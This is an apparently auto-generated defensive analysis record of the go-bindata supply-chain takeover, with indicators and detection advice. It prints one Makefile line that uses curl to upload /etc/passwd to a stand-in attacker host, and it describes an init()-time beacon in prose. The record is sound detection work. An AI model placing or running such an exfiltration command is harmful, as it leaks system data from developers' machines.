package_info.package_versions: All versions published after the original creator's account deletion (potentially affected)
package_info.why_malicious: After the original creator's GitHub account was deleted, a new user registered the same account name and gained control of the go-bindata repository. This allowed the attacker to publish new versions of the package under a previously trusted namespace, enabling the injection of malicious code into a widely used dependency. Users who updated or installed the package after the takeover could unknowingly execute attacker-controlled code, leading to potential data exfiltration or system compromise.

execution_context.trigger: import-time or build-time (via Go's init function)
execution_context.file_location: main.go or any Go source file in the compromised go-bindata repository

malicious_snippets.code_behavior: When the package is imported or built, the init() function executes automatically, sending environment information (such as the system's hostname) to an external attacker-controlled server without user knowledge or consent.

malice_analysis.why_suspicious: The presence of unsolicited network requests in an init() function is highly suspicious, as it enables data exfiltration at import or build time without user interaction. Legitimate Go packages, especially utilities like go-bindata, should not perform network operations automatically.
malice_analysis.violated_expectations: A utility package like go-bindata is expected to provide asset embedding functionality only. It should not initiate network connections or exfiltrate environment data during import or build, especially without explicit user action or documentation.
malice_analysis.similar_legitimate_use: Some packages implement telemetry or update checks, but these are always documented, require user consent, and never exfiltrate sensitive environment data without transparency.
key_indicators: Network requests initiated in init() or global scope
References to external, non-official domains (e.g., malicious.example.com)
No user interaction or documentation for such behavior
Asynchronous execution of network requests at import/build time

execution_context.trigger: build-time (when running the Makefile or build script)
execution_context.file_location: Makefile or build script in the compromised repository

malicious_snippets.code_snippet:
# Malicious Makefile command
all:
	curl -d @/etc/passwd http://malicious.example.com/upload
malicious_snippets.code_behavior: During the build process, the Makefile executes a command that reads the sensitive /etc/passwd file and uploads its contents to an external attacker-controlled server, resulting in exfiltration of system user information.

malice_analysis.why_suspicious: Build scripts should never access or transmit sensitive system files such as /etc/passwd. The use of curl to send local files to an external domain is a clear indicator of malicious intent.
malice_analysis.violated_expectations: Build automation is expected to compile and package code only. Accessing and exfiltrating system files is a severe violation of trust and security best practices.
malice_analysis.similar_legitimate_use: There is no legitimate reason for a build script to upload /etc/passwd or any sensitive file to an external server. Such behavior is always malicious.
key_indicators: Access to sensitive files (e.g., /etc/passwd) in build scripts
Use of curl or similar tools to transmit data externally
Network exfiltration commands embedded in Makefile or build scripts
No documentation or user prompt for such actions

attack_chain.action: Attacker registers a new GitHub account with the same username as the deleted original maintainer and takes control of the go-bindata repository.
attack_chain.leads_to: Attacker gains the ability to publish new code under a previously trusted namespace.

attack_chain.action: Attacker publishes a new version of go-bindata containing malicious code, including network exfiltration in Go source files and build scripts.
attack_chain.leads_to: Malicious code is distributed to users who update or install the package.

attack_chain.action: Developers import or build the compromised package, triggering the execution of malicious payloads.
attack_chain.leads_to: Sensitive data (such as environment variables and system files) is exfiltrated to attacker-controlled infrastructure.

behavioral_signatures: Unsolicited network requests initiated during package import or build (e.g., in Go init() functions or build scripts)
Access to sensitive files (such as /etc/passwd) in build or installation scripts
Use of environment variables in network requests within package code
Presence of asynchronous network calls in Go package initialization
file_indicators: Go source files (e.g., main.go) containing unexpected import of net/http and os packages with network code in init()
Build scripts (Makefile, shell scripts) containing curl or wget commands targeting external, non-official domains
References to /etc/passwd or other sensitive file paths in build automation files
network_indicators: Outbound HTTP requests to domains such as malicious.example.com during package import or build
Data uploads to attacker-controlled endpoints specified in code or scripts (e.g., /collect, /upload paths)
Unexpected DNS lookups or connections to domains not associated with the legitimate package
detection_knowledge.how_to_detect: Monitor for network activity initiated by Go package imports or build scripts, especially HTTP requests to unknown or suspicious domains. Review source and build scripts for unauthorized access to sensitive files or environment variables and for embedded network exfiltration logic. Use file integrity monitoring to detect unauthorized changes to source or build files. Verify package provenance and maintainer identity, especially after account or namespace changes, using cryptographic signatures or checksums. Flag packages that access sensitive files or make network requests without clear documentation or user consent.
